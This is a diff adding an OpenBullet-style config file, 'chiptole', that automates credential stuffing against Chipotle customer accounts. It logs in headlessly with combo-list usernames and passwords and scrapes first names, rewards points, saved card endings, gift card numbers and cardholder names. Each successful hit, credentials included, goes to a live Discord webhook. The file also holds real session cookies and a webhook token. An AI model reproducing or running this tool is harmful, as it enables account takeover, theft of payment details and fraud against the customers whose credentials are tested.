@@ -1,0 +1,243 @@
+[SETTINGS]
+{
+  "Name": "chiptole",
+  "SuggestedBots": 3,
+  "MaxCPM": 0,
+  "LastModified": "2021-10-09T10:56:38.3936234-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "Contact1001",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": true,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": true,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": true,
+  "AlwaysOpen": false,
+  "AlwaysQuit": true,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": true,
+  "CustomUserAgent": "",
+  "RandomUA": true,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+!REQUEST POST "https://www.dcode.fr/api/" 
+!  CONTENT "tool=luhn-algorithm&numbers=98889922682710&check=true" 
+!  CONTENTTYPE "text/plain" 
+!  HEADER ": scheme: https" 
+!  HEADER "accept: application/json, text/javascript, */*; q=0.01" 
+!  HEADER "accept-encoding: gzip, deflate, br" 
+!  HEADER "accept-language: en-US,en;q=0.9" 
+!  HEADER "content-length: 56" 
+!  HEADER "content-type: application/x-www-form-urlencoded; charset=UTF-8" 
+!  HEADER "cookie: _ga=GA1.2.1721386178.1630601106; __qca=P0-1894160799-1630601106830; PHPSESSID=3627ed29827c18fa9d5a2251b8bcc240; _gid=GA1.2.1939344325.1633298140; euconsent-v2=CPNhYSaPNhYSaAKAjAENBvCsAP_AAH_AAAqIIPtf_X__bX9j-_59f_t0eY1P9_r_v-Qzjhfdt-8F2L_W_L0X42E7NF36pq4KuR4Eu3LBIQNlHMHUTUmwaokVrzHsak2MryNKJ7LEmnMZO2dYGHtPn91TuZKY7_78__fz3z-v_t_-39T37-3_3__5_X---_e_V399zLv9____39nN___9v-gg8ASYal5AF2ZY4Mm0aVQogRhWEh0AoAKKAYWiKwAYHBTsrAI9QQsAEJqAjAiBBiCjBgEAAgkASERASAFggEQBEAgABACpAQgAImAQWAFgYBAAKAaFiBFAEIEhBkcFRymBAVItFBLZWAJQd7GmEIZb4EUCj-iowEazRAsDISFg5jgCQEvFkAAA.f_gAAAAAAAAA; addtl_consent=1~39.4.3.9.6.5.4.13.6.4.15.9.5.2.7.4.1.7.1.3.2.10.3.5.4.21.4.6.9.7.10.2.9.2.12.6.7.6.14.5.20.6.5.1.3.1.11.29.4.14.4.5.3.10.6.2.9.6.6.4.5.4.4.29.4.5.3.1.6.2.2.17.1.17.10.9.1.8.6.2.8.3.4.142.4.8.35.7.15.1.14.3.1.8.10.25.3.7.25.5.18.9.7.41.2.4.18.21.3.4.2.1.6.6.5.2.14.18.7.3.2.2.8.20.8.8.6.3.10.4.20.2.4.9.4.6.4.11.1.3.22.16.2.6.8.2.4.11.6.5.17.16.11.8.1.10.28.12.1.3.21.2.7.6.1.9.30.17.4.9.15.8.7.3.6.6.7.2.4.1.7.12.13.22.13.2.12.2.10.1.4.15.2.4.9.4.5.1.3.7.13.5.15.4.13.4.14.8.2.15.2.5.5.1.2.2.1.2.14.7.4.8.2.9.10.18.12.13.2.18.1.1.3.1.1.9.25.4.1.19.8.4.5.2.1.5.4.8.4.2.2.2.14.2.13.4.2.6.9.6.3.4.3.5.2.3.6.10.11.2.4.3.16.3.11.3.1.2.3.9.19.11.15.3.10.7.6.4.3.4.6.3.3.3.3.1.1.1.6.11.3.1.1.7.4.6.1.10.5.2.6.3.2.2.4.3.2.2.7.2.13.7.12.2.1.6.4.5.4.3.2.2.4.1.3.1.1.1.2.9.1.6.9.1.5.2.1.7.2.8.11.1.3.1.1.2.1.3.2.6.1.5.6.1.5.3.1.3.1.1.2.2.7.7.1.4.1.2.6.1.2.1.1.3.1.1.4.1.1.2.1.8.1.7.4.3.2.1.3.5.3.9.6.1.15.10.28.1.2.1.1.12.3.4.1.6.3.4.7.1.3.1.1.3.1.5.3.1.3.2.2.1.1.4.2.1.2.1.1.1.2.2.4.2.1.2.2.2.4.1.1.1.2.1.1.1.1.1.1.2.1.1.1.2.2.1.1.2.1.2.1.7.1.2.1.1.1.2.1.1.1.1.2.1.1.3.2.1.1.8.1.1.1.5.2.1.6.5.1.1.1.1.1.2.2.3.1.1.4.1.1.2.2.1.1.4.2.1.1.2.2.1.2.1.2.3.1.1.1.1.4.1.1.1.5.1.9.3.1.5.1.1.3.4.1.2.3.1.4.2.1.2.2.2.1.1.1.1.1.1.11.1.3.1.1.2.2.1.4.2.3.2.1.4.1.1.1.1.1.3.2.1.1.2.5.1.9.4.1.1.3.1.4.3.1.4.5.1.7.2.1.1.1.2.1.1.1.4.2.1.12.1.1.3.1.2.2.3.1.2.1.1.1.2.1.1.2.1.1.1.1.2.1.3.1.5.1.2.4.3.8; _pbjs_userid_consent_data=2345184998097464; session_id=21a057a2-7c18-4662-b1a6-111a40e5bdd8; cto_bidid=449qWF9ISDBFR3FaZlBEaklwa1ElMkJKNmczSUlqdnJHUVFIQXg3MDllYmFuQmZPQ0g5ZXREMGs0UmpJcVZhMlBLZUUxbkxUWTB2SlViWjRqTnEwSUY4bGg3clNhamdycFp6Wm15NG4xdWR1VGlXVEJFJTNE; cto_bundle=GTQcPl9DaE0zaUhVMEFTdnVTOGowJTJGUUpOZHglMkZkJTJCSjJOM2xBMmlhdHZIZVFKQTUzRVN3NTRGRVYyaXhidnkwanclMkZJTkJoTWglMkZ4OHQwaHAxdEtpaG9nNiUyRjB0b3dOSVV6OE9pZkxiQzM3dndhMWZvWXF3ZzhLaW0zbUJBa3REc1R3JTJCWm5RUkJoTTRROHNtOHlqbXNsT1phbllUUSUzRCUzRA; cto_bundle=iy53lV9DaE0zaUhVMEFTdnVTOGowJTJGUUpOZDZSVUdCbG9jcTZQRmQlMkZMZzhTcHo4QkhHYTBYVno5RCUyRk9VS1NUSHpHNUtBMXdYaUpodXk0TlhIMXZMUk9HZWtDTUJKU2dyVEFwVEtra0xVVFUwelRsdGRrbHRXNlJHckQyMFl5eXBjVUFUSm5yeVRwMkdnS3hGazZrNWVMR3FVTXclM0QlM0Q; cto_bundle=iy53lV9DaE0zaUhVMEFTdnVTOGowJTJGUUpOZDZSVUdCbG9jcTZQRmQlMkZMZzhTcHo4QkhHYTBYVno5RCUyRk9VS1NUSHpHNUtBMXdYaUpodXk0TlhIMXZMUk9HZWtDTUJKU2dyVEFwVEtra0xVVFUwelRsdGRrbHRXNlJHckQyMFl5eXBjVUFUSm5yeVRwMkdnS3hGazZrNWVMR3FVTXclM0QlM0Q; id5id=%7B%22created_at%22%3A%222021-09-28T01%3A57%3A09Z%22%2C%22id5_consent%22%3Atrue%2C%22original_uid%22%3A%22ID5*7KdQjGFAAFDiWZtO9tnoZSThU5z6MYhPCOTv_n4q9eEAAKJYdAACT9rb3vktBhUd%22%2C%22universal_uid%22%3A%22ID5*5RP65pVpV4TyTk-w1xxsgcTXiQ_E2CESh4kEg_z8NfoAADcIR7POWPZzai56xhnH%22%2C%22signature%22%3A%22ID5_Ad2bOTRqjbUcONVLtsEt0Qi3uvy-M3cRM7thJ2LvvbTVukbV427qe68UjvmihZqxtYDdAqlbXb_czz5t7fWhHt8%22%2C%22link_type%22%3A2%2C%22cascade_needed%22%3Atrue%2C%22privacy%22%3A%7B%22jurisdiction%22%3A%22gdpr%22%2C%22id5_consent%22%3Atrue%7D%7D; id5id_last=Sun%2C%2003%20Oct%202021%2021%3A55%3A48%20GMT; __gads=ID=62610ba0c9d87222:T=1630601108:S=ALNI_MbOGSPHbDFhLgrfgqfUQUxMIoaIew" 
+!  HEADER "dnt: 1" 
+!  HEADER "origin: https://www.dcode.fr" 
+!  HEADER "referer: https://www.dcode.fr/luhn-algorithm" 
+!  HEADER "sec-ch-ua: \"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\"" 
+!  HEADER "sec-ch-ua-mobile: ?0" 
+!  HEADER "sec-ch-ua-platform: \"Windows\"" 
+!  HEADER "sec-fetch-dest: empty" 
+!  HEADER "sec-fetch-mode: cors" 
+!  HEADER "sec-fetch-site: same-origin" 
+!  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36" 
+!  HEADER "x-requested-with: XMLHttpRequest" 
+
+#LEgit BROWSERACTION Open 
+
+#fu BROWSERACTION ClearCookies 
+
+#saying NAVIGATE "https://www.chipotle.com/order/sign-in" 10 
+
+#else BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+#2 ELEMENTACTION XPath "/html/body/div[1]/div[1]/div[2]/div[1]/div/div/div/div[3]/div[1]/form/div[1]/div/div[2]/input" Recursive=TRUE 
+  Click 
+
+FUNCTION Delay "500" 
+
+#3 ELEMENTACTION XPath "/html/body/div[1]/div[1]/div[2]/div[1]/div/div/div/div[3]/div[1]/form/div[1]/div/div[2]/input" 
+  WaitForElement 
+
+#4 ELEMENTACTION Class "text-input-container" 
+  Click 
+
+#5 ELEMENTACTION XPath "/html/body/div[1]/div[1]/div[2]/div[1]/div/div/div/div[3]/div[1]/form/div[1]/div/div[2]/input" 
+  SendKeysHuman "<USER>" 
+
+#6 FUNCTION Delay "500" 
+
+#7 ELEMENTACTION XPath "/html/body/div[1]/div[1]/div[2]/div[1]/div/div/div/div[3]/div[1]/form/div[2]/div/div[2]/input" 
+  Click 
+
+#8 ELEMENTACTION XPath "/html/body/div[1]/div[1]/div[2]/div[1]/div/div/div/div[3]/div[1]/form/div[2]/div/div[2]/input" 
+  SendKeys "<PASS>" 
+
+#9 ELEMENTACTION XPath "/html/body/div[1]/div[1]/div[2]/div[1]/div/div/div/div[3]/div[2]/div/div/div" 
+  Click 
+
+FUNCTION Delay "1000" 
+
+BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "Hey </div>" 
+
+PARSE "<SOURCE>" LR "class=\"points-balance\">" "<" CreateEmpty=FALSE -> CAP "Points" "" " POINTS" 
+
+PARSE "<SOURCE>" LR "Hey </div>" "<" CreateEmpty=FALSE -> CAP "FIRSTNAME" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<FIRSTNAME>" Exists 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<FIRSTNAME>" DoesNotExist 
+
+IF "<FIRSTNAME>" DoesNotExist 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<FIRSTNAME>" Exists 
+  KEYCHAIN Failure OR 
+    KEY "<FIRSTNAME>" DoesNotExist 
+
+ENDIF
+##PARSE "<SOURCE>" LR "class=\"points-balance\">" "<" CreateEmpty=FALSE -> CAP "POINTSa" 
+##NAVIGATE "https://chipotle.com/order/retro-credit" 
+
+FUNCTION Delay "1000" 
+
+ELEMENTACTION XPath "/html/body/div[1]/div[1]/div[1]/div[1]/div[1]/div/div/div/h6" 
+  Click 
+
+FUNCTION Delay "1000" 
+
+PARSE "<SOURCE>" LR "class=\"points-balance\">" "<" CreateEmpty=FALSE -> CAP "POINTS" 
+
+PARSE "<SOURCE>" LR "id=\"batBeacon" "\"" -> VAR "bat" "batBeacom" "" 
+
+PARSE "<SOURCE>" LR "insertBefore(c,b)};a.load(\"" "\"\"" -> VAR "Pnode" "batBeacom" "" 
+
+PARSE "<SOURCE>" LR "mid=" ";" -> VAR "mid" 
+
+PARSE "<SOURCE>" LR "sid=" ";" -> VAR "sid" 
+
+PARSE "<SOURCE>" LR "vid=" ";" -> VAR "vid" 
+
+PARSE "<SOURCE>" LR "https://urldefense.com/" ">" Recursive=TRUE -> VAR "urldef" "https://urldefense.com/" "" 
+
+PARSE "<SOURCE>" LR "https://secure.adnxs.com/px?id=" ">" -> VAR "px" "https://secure.adnxs.com/px?id=" "" 
+
+PARSE "<SOURCE>" LR "snaptr(\"init\",\"" "\"" -> VAR "snap" "snaptr(\"init\",\"" "" 
+
+PARSE "<SOURCE>" LR "TTDUniversalPixelApi;universalPixelApi.init(\"" "]" -> VAR "pixelapi" "" "]" 
+
+PARSE "<SOURCE>" LR "class=\"saved-cards\">" "<" -> VAR "cc" 
+
+BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+ELEMENTACTION XPath "/html/body/div[1]/div[1]/div[1]/div[1]/div[1]/div/div/div/h6" 
+  Click 
+
+BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+##NAVIGATE "https://chipotle.com/order/edit-account" 
+
+PARSE "<SOURCE>" LR "Card ending in" "<" Recursive=TRUE CreateEmpty=FALSE -> CAP "card" "Cards " "" 
+
+PARSE "<SOURCE>" LR "gift-card-number\">" "<" Recursive=TRUE CreateEmpty=FALSE -> CAP "gift card" "Cards " "" 
+
+PARSE "<SOURCE>" LR "card-holder-name\">" "<" Recursive=TRUE CreateEmpty=FALSE -> CAP "card holder" "Cards " "" 
+
+ELEMENTACTION XPath "/html/body/div[1]/span[3]/div[2]/div/div/div/div[3]/div[3]/div/div[5]/div/ul/li[3]/div/div/h3" 
+  Click 
+
+BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+PARSE "<SOURCE>" LR "Card ending in" "<" Recursive=TRUE CreateEmpty=FALSE -> CAP "card" "Cards " "" 
+
+PARSE "<SOURCE>" LR "gift-card-number\">" "<" Recursive=TRUE CreateEmpty=FALSE -> CAP "gift card" "Cards " "" 
+
+PARSE "<SOURCE>" LR "card-holder-name\">" "<" Recursive=TRUE CreateEmpty=FALSE -> CAP "card holder" "Cards " "" 
+
+FUNCTION Delay "500" 
+
+BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+PARSE "<SOURCE>" LR "Card ending in" "<" Recursive=TRUE CreateEmpty=FALSE -> CAP "card" "Cards " "" 
+
+PARSE "<SOURCE>" LR "gift-card-number\">" "<" Recursive=TRUE CreateEmpty=FALSE -> CAP "gift card" "Cards " "" 
+
+PARSE "<SOURCE>" LR "card-holder-name\">" "<" Recursive=TRUE CreateEmpty=FALSE -> CAP "card holder" "Cards " "" 
+
+BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+REQUEST GET "https://mboxedge34.tt.omtrdc.net/rest/v1/delivery?client=cmgstrategycollc&sessionId=d357f9f022574048bb77e47f54940047&version=2.3.0" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST GET "https://www.chipotle.com/libs/granite/csrf/token.json" 
+  
+  HEADER "User-Agent	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv: 91.0) Gecko/20100101 Firefox/91.0" 
+
+PARSE "<HEADERS[*]>" LR "" "" -> VAR "HEADS" 
+
+REQUEST GET "https://app.link/_r?sdk=web2.58.2&_t=950610218705339222&branch_key=key_live_hfK28UOcUBBlr9owR5EW2gpdtAkb0vgc&callback=branch_callback__12" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<COOKIES[*]>" LR "" "" -> VAR "_S" 
+
+PARSE "<HEADERS[*]>" LR "" "" -> VAR "tails" 
+
+PARSE "<tails>" LR "Date" ")" -> VAR "since" 
+
+REQUEST GET "https://api2.branch.io/v1/has-app/key_live_hfK28UOcUBBlr9owR5EW2gpdtAkb0vgc?browser_fingerprint_id=950610218705339222&instrumentation=%7B%22%2Fv1%2Fhas-app-brtt%22%3A%22293%22%2C%22%2F_r-brtt%22%3A%22419%22%7D" 
+  
+  HEADER "User-Agent	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv: 91.0) Gecko/20100101 Firefox/91.0" 
+
+REQUEST POST "https://chipotle.com/order/?UTM_Source=salesforce&UTM_medium=email-rewards&UTM_Campaign=WJ_1.1_WelcomeEmail&UTM_Content=Hero_Image" 
+  CONTENT "{\"ShouldTimeout\":false,\"UserName\":\"<USER>\",\"Password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "td><div id=\"Message\">" "<" CreateEmpty=FALSE -> CAP "HACKED" 
+
+!KEYCHECK BanOnToCheck=FALSE 
+!  KEYCHAIN Success AND 
+!    KEY "OK" 
+
+FUNCTION Constant "WHO: <USER> : <PASS> <FIRSTNAME> Holds <POINTS> Checked on <since> SAVED CC= <card> | <gift card>   | 🤾 🤺  BruteAll AKA Contact#1001" -> CAP "Chipotle " 
+
+IF "<Chipotle >" Contains "@" 
+
+REQUEST POST "https://discord.com/api/webhooks/890454939002884116/-rllZd3dQJS6_scaUQ_VS2W1GyL8MRkVpbtAeOEcCbNTLoPf8AT9fddfL71Piz9HBcfP" 
+  CONTENT "{\"content\":\">>> ```<USER>:<PASS> | <Chipotle >```\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+ENDIF
+
